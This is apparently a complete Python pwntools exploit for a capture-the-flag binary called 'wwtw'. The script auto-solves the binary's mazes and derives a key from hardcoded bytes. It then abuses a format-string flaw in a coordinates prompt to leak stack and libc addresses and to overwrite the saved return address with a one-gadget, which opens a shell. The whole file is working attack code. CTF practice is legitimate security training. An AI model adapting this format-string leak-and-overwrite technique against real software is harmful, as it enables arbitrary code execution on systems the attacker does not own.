#!/usr/bin/python
from pwn import *
import pdb

def print_maze(maze):
    print ' ' + '-'*21
    for row in maze:
        print "|" + row + "|"
    print ' ' + '-'*21

def get_player_pos(maze):

    for row in xrange(0, 20):
        for col in xrange(0, 20):
            if maze[row][col] == '>' or maze[row][col] == '<' or maze[row][col] == '^' or maze[row][col] == 'V':
                return (row, col)

def get_exit_pos(maze):
    for row in xrange(0, 20):
        for col in xrange(0, 20):
            if maze[row][col] == 'E' or maze[row][col] == 'T':
                return (row, col)

def get_angels(maze):
    angels = []
    for row in xrange(0, 20):
        for col in xrange(0, 20):
            if maze[row][col] == 'A':
                angels.append((row, col))

    return angels


def read_maze(p):
    p.recvuntil("012345678901234567890")
    p.recvline()

    maze = []
    for _ in xrange(0, 20):
        row = p.recvuntil("\n")[3:-1]
        maze.append(row)

    return maze

def do_moves(p, moves):

    for move in moves:

        maze = read_maze(p)
        player_p = get_player_pos(maze)
        exit_p = get_exit_pos(maze)
        print_maze(maze)

def solve_maze(p):

    while 1:
        maze = read_maze(p)
        player_p = get_player_pos(maze)
        exit_p = get_exit_pos(maze)
        dist = (player_p[0] - exit_p[0], player_p[1] - exit_p[1])
        move = ''

        if dist[0] > 0:
            move = 'w'
        elif dist[0] < 0:
            move = 's'
        elif dist[1] > 0:
            move = 'a'
        elif dist[1] < 0:
            move = 'd'

        p.recvuntil("Your move (w,a,s,d,q):")
        print "dist:", dist, " move:", move
        p.sendline(move)

        if dist[0] == 0 and abs(dist[1]) == 1:
            break
        if abs(dist[0]) == 1 and dist[1] == 0:
            break

def calc_tardis_key():
    state = "\x55\x89\xE5\x53\x83\xEC\x24\xE8" + "\xDC\xFB\xFF\xFF\x81\xC3\x3C\x41" + "\x00\x00\xC7\x45\xF0\x0A\x00\x00"
    res_state = []
    ctr = 0
    for byte in state:
        dec_byte = chr(ord(byte) & 0x7f)
        if dec_byte.isalnum():
            res_state.append(dec_byte)
            ctr += 1

    return "".join(res_state)

def solve_all_mazes():

    solved = False

    p = process("./wwtw", env = {"LD_PRELOAD":"/mnt/hgfs/vmshare.nosync/the_gauntlet/easy/wibbly_wobbly_timey_wimey/libc.so.6"})
    while not solved:
        try:
            p.recvuntil("don't blink!")
            p.recvline()

            level = 0;
            for level in xrange(0, 4):
                solve_maze(p)
                print "Beat level:", level
                line = p.recvline()
                print line
                if "TARDIS" in line:
                    solve_maze(p)
                    solved = True
                    break

        except EOFError:
            p.close()
            p = process("./wwtw")
            continue

    return p


def sock_connect():
    s = None
    try:
        s = remote("localhost", "1234")
        return s
    except pwnlib.exception.PwnlibException:
        return s

if __name__ == "__main__":
    key = calc_tardis_key()
    p = solve_all_mazes()
    l = listen(1234, "127.0.0.1", typ="udp")
    p.recvuntil("TARDIS KEY:")
    p.sendline(key)
    p.recvuntil("Selection: ")

    timeval = "\x70\x2b\x59\x55"
    l.wait_for_connection()

    while not l.can_recv():
        continue

    foo = l.recv()
    l.send(timeval)

    coord1 = "51.492137"
    coord2 = "-0.192878"

    #stack leak: 0xffd48985 + 0x387
    # stack leak offset: 9

    fmt_str = "%9$lx.%270$lx"

    #gdb.attach(p, 'ni\nhandle SIGALRM pass\nni')
    sleep(2)

    p.sendline('1')
    p.recvuntil("Selection: ")
    p.sendline('3')
    p.recvuntil("Coordinates: ")

    p.sendline(coord1 + fmt_str + ',' + coord2)

    leak = p.recvuntil("," + coord2).split("51.492137")[2].split(",-0.192878")[0].split(".")

    stack_leak = int(leak[0], 16)
    libc_leak = int(leak[1], 16)
    libc_base = libc_leak - 0x65cbb
    one_gadget_addr = libc_base + 0x67a7f
    saved_ip_addr = stack_leak + 0x3f9

    print "stack leak: '" + hex(stack_leak) + "'"
    print "libc base: '" + hex(libc_base) + "'"

    p.recvuntil("Coordinates: ")

    byte_1 = one_gadget_addr & 0xFF
    byte_2 = (one_gadget_addr >> 8) & 0xFF
    byte_3 = (one_gadget_addr >> 16) & 0xFF
    byte_4 = (one_gadget_addr >> 24) & 0xFF

    print "byte 1: '" + hex(byte_1) + "'"
    if(byte_1):
        byte_1_str = "%0" + str(byte_1) + "x" + "%18$hhn" + "%0" + str(0x100 - byte_1) + "x"
    else:
        byte_1_str = "%0" + str(byte_1) + "x" + "%18$hhn"

    print "byte 2: '" + hex(byte_2) + "'"
    if(byte_2):
        byte_2_str = "%0" + str(byte_2) + "x" + "%19$hhn" + "%0" + str(0x100 - byte_2) + "x"
    else:
        byte_2_str = "%0" + str(byte_2) + "x" + "%19$hhn"

    print "byte 3: '" + hex(byte_3) + "'"
    if(byte_3):
        byte_3_str = "%0" + str(byte_3) + "x" + "%20$hhn" + "%0" + str(0x100 - byte_3) + "x"
    else:
        byte_3_str = "%0" + str(byte_3) + "x" + "%20$hhn"

    print "byte 4: '" + hex(byte_4) + "'"
    if(byte_4):
        byte_4_str = "%0" + str(byte_4) + "x" + "%21$hhn" + "%0" + str(0x100 - byte_4) + "x"
    else:
        byte_4_str = "%0" + str(byte_4) + "x" + "%21$hhn"

    overwrite_str = "AAA" + p32(saved_ip_addr) +p32(saved_ip_addr+1) +p32(saved_ip_addr+2) +p32(saved_ip_addr+3) + "%0228x" + byte_1_str + byte_2_str + byte_3_str + byte_4_str
    p.sendline(coord1 + overwrite_str + "," + coord2)

    p.recvuntil("Coordinates: ")
    p.sendline("0.0,0.0")
    p.interactive()
